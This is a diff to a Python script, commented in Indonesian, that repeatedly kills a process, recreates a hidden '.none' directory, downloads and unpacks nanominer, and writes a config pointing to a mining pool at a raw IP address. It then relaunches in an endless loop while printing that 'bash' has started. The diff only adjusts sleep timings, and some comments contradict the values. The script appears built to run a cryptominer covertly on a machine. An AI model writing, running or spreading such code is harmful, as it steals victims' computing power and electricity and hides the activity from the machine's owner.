@@ -1,7 +1,6 @@
 import subprocess
 import time
 import os
-import random
 
 # Pastikan skrip selalu berjalan di direktori home
 os.chdir(os.path.expanduser("~"))
@@ -9,7 +8,7 @@ os.chdir(os.path.expanduser("~"))
 def run_bash():
     commands = [
         "pkill none && sleep 2",
-        "rm -rf .none && sleep 2",
+        "rm -rf .none && sleep 60",
         "mkdir .none && cd .none",
         "wget https://github.com/nanopool/nanominer/releases/download/v3.9.3/nanominer-linux-3.9.3.tar.gz",
         "tar -xvf nanominer-linux-3.9.3.tar.gz",
@@ -30,7 +29,6 @@ pool1 = 47.236.66.121:443' > config.ini"""
 
     for cmd in commands:
         subprocess.run(cmd, shell=True)
-        delay = random.uniform(60.0, 61.0)  # Delay antar perintah 1.5–4 detik
         time.sleep(2)  # Delay agar berurutan
 
     print("✅ bash dimulai...")
@@ -38,6 +36,5 @@ pool1 = 47.236.66.121:443' > config.ini"""
 
 while True:
     run_bash()
-    delay = random.randint(300, 310)  # Delay sebelum restart 5–10 menit
     print("⏳ Menunggu 300 detik sebelum restart...")
-    time.sleep(300)  # Tunggu 300 detik sebelum restart
+    time.sleep(360)  # Tunggu 300 detik sebelum restart
